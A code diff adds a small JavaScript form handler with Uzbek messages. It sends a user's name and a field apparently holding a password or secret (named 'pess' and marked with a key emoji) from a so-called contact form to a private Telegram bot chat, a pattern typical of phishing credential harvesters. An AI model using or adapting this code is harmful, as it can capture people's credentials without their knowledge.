@@ -1,0 +1,31 @@
+const BOT_TOKEN = "BOT_TOKENINGIZNI_BU_YERGA_YOZING";
+const ADMIN_CHAT_ID = "ADMIN_CHAT_IDINGIZNI_BU_YERGA_YOZING";
+const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+document.getElementById("contactForm").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  let name = document.getElementById("name").value;
+  let pess = document.getElementById("pess").value;
+
+  let adminText = `📩 Yangi ma'lumot keldi:\n👤 Ism: ${name}\n🔑 Ma'lumot: ${pess}`;
+
+  fetch(TELEGRAM_API, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: ADMIN_CHAT_ID,
+      text: adminText,
+      parse_mode: "HTML"
+    })
+  })
+  .then(res => res.json())
+  .then(data => {
+    alert("Ma'lumot yuborildi!");
+    document.getElementById("contactForm").reset();
+  })
+  .catch(err => {
+    alert("Xatolik yuz berdi!");
+    console.error(err);
+  });
+});
